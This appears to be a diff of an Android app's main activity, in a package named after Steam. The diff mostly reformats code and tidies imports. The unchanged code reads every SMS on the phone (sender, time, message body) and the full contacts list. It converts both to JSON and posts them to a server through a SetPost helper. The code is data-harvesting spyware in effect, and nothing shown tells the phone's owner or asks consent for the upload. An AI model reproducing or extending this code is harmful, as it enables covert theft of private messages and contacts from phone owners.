@@ -1,21 +1,19 @@
 package com.steam.android.androidsteam;
 
 import android.Manifest;
-import android.app.AlertDialog;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.database.sqlite.SQLiteException;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.os.Bundle;
 import android.os.Environment;
 import android.provider.ContactsContract;
 import android.support.annotation.NonNull;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -23,36 +21,33 @@ import android.widget.EditText;
 import android.widget.Toast;
 
 import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-
 
 import java.io.File;
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
     Button btn2;
-    private Context context ;
-    private List<ContactsData> contactsDatas = new ArrayList<>();
+    private Context context;
+    private final List<ContactsData> contactsDatas = new ArrayList<>();
     private EditText editText;
     private Button button;
     private String urlString = null;
     private AsyncTask asyncTask;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         //btn2 = (Button) findViewById(R.id.button2);
 
-        context=this;
+        context = this;
 
-        editText =(EditText) findViewById(R.id.edit_tv);
+        editText = findViewById(R.id.edit_tv);
         editText.setSelection(editText.getText().toString().length());
-        button = (Button) findViewById(R.id.btn);
+        button = findViewById(R.id.btn);
 
         button.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -64,7 +59,8 @@ public class MainActivity extends AppCompatActivity {
             }
         });
     }
-    private void initTask(){
+
+    private void initTask() {
         asyncTask = new AsyncTask() {
             @Override
             protected Object doInBackground(Object[] params) {
@@ -86,33 +82,34 @@ public class MainActivity extends AppCompatActivity {
             }
         };
     }
+
     public void sms(View view) {
         //获取内容提供者
         ContentResolver contentResolver = getContentResolver();
         //获取短信表的路径
         Uri uri = Uri.parse("content://sms");
         //设置要查询的列名
-        String[] line = {"address", "date", "body","_id","thread_id"};
+        String[] line = {"address", "date", "body", "_id", "thread_id"};
         //各个参数的意思，路径、列名、条件、条件参数、排序
         Cursor cursor = contentResolver.query(uri, line, null, null, null);
-        List<Map<String,String>> list = new ArrayList<Map<String,String>>();
+        List<Map<String, String>> list = new ArrayList<Map<String, String>>();
 
         //下面就跟操作普通数据库一样了
         if (cursor != null) {
             while (cursor.moveToNext()) {
-                Map<String,String> map = new HashMap<String,String>();
+                Map<String, String> map = new HashMap<String, String>();
                 String address = cursor.getString(cursor.getColumnIndex("address"));
                 String date = cursor.getString(cursor.getColumnIndex("date"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
-                String _id= cursor.getString(cursor.getColumnIndex("_id"));
-                String thread_id= cursor.getString(cursor.getColumnIndex("thread_id"));
-               // Log.e("短信", "\n手机号:" + address + "\n时间:" + date + "\n内容:" + body+"\nid："+_id+"\n对话的序号："+thread_id);
+                String _id = cursor.getString(cursor.getColumnIndex("_id"));
+                String thread_id = cursor.getString(cursor.getColumnIndex("thread_id"));
+                // Log.e("短信", "\n手机号:" + address + "\n时间:" + date + "\n内容:" + body+"\nid："+_id+"\n对话的序号："+thread_id);
 
-                map.put("手机号",address);
-                map.put("时间",date);
-                map.put("内容",body);
-                map.put("id",_id);
-                map.put("对话的序号",thread_id);
+                map.put("手机号", address);
+                map.put("时间", date);
+                map.put("内容", body);
+                map.put("id", _id);
+                map.put("对话的序号", thread_id);
                 list.add(map);
 
             }
@@ -125,7 +122,6 @@ public class MainActivity extends AppCompatActivity {
                 public void run() {
 
 
-
                     //System.out.print(myJson.toString());
                     SetPost sp = new SetPost();
                     sp.HttpPostData(a);
@@ -134,13 +130,14 @@ public class MainActivity extends AppCompatActivity {
             cursor.close();
         }
     }
-    public  void sp(View view){
+
+    public void sp(View view) {
         Toast.makeText(MainActivity.this, "线程执行", Toast.LENGTH_SHORT).show();
         new Thread(new Runnable() {
             @Override
             public void run() {
                 requestAllPower();
-                if(isSdCardExist()){
+                if (isSdCardExist()) {
                     System.out.println("sd存在");
                     //System.out.println(Test.getFileNameAndFileByPath("/storage/emulated/0/DCIM/Camera").get(0).getFilePath());
                     System.out.println(getSdCardPath());
@@ -152,11 +149,10 @@ public class MainActivity extends AppCompatActivity {
         }).start();
 
 
-
-
     }
+
     //动态申请存储权限
-    public  void requestAllPower() {
+    public void requestAllPower() {
         System.out.println("动态权限");
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.WRITE_EXTERNAL_STORAGE)
@@ -173,6 +169,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
     }
+
     //获取默认文件存放路径
     public static String getDefaultFilePath() {
         String filepath = "";
@@ -185,6 +182,7 @@ public class MainActivity extends AppCompatActivity {
         }
         return filepath;
     }
+
     //读取sd跟目录
     public static String getSdCardPath() {
         boolean exist = isSdCardExist();
@@ -198,16 +196,18 @@ public class MainActivity extends AppCompatActivity {
         return sdpath;
 
     }
+
     //查看sd是否存在
     public static boolean isSdCardExist() {
         return Environment.getExternalStorageState().equals(
                 Environment.MEDIA_MOUNTED);
     }
+
     public void phoneNumber(View view) {
         //动态获取权限
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED){
-            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS},1);
-        }else {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, 1);
+        } else {
             get2();
         }
     }
@@ -267,7 +267,7 @@ public class MainActivity extends AppCompatActivity {
             }
             contactId.close();
         }
-        Log.d("测试","开始打印");
+        Log.d("测试", "开始打印");
         for (ContactsData c : contactsDatas) {
             Log.e("联系人", c.toString());
         }
@@ -322,13 +322,13 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         cursor.close();
-        Log.d("测试","开始打印");
-        List<Map<String,String>> list = new ArrayList<Map<String,String>>();
+        Log.d("测试", "开始打印");
+        List<Map<String, String>> list = new ArrayList<Map<String, String>>();
         for (ContactsData c : contactsDatas) {
-            Map<String,String> map = new HashMap<String,String>();
+            Map<String, String> map = new HashMap<String, String>();
             Log.e("联系人", c.toString());
-            map.put("number",c.getNumber());
-            map.put("name",c.getName());
+            map.put("number", c.getNumber());
+            map.put("name", c.getName());
             list.add(map);
         }
         final String a = JSON.toJSONString(list);
@@ -337,7 +337,6 @@ public class MainActivity extends AppCompatActivity {
         new Thread(new Runnable() {
             @Override
             public void run() {
-
 
 
                 //System.out.print(myJson.toString());
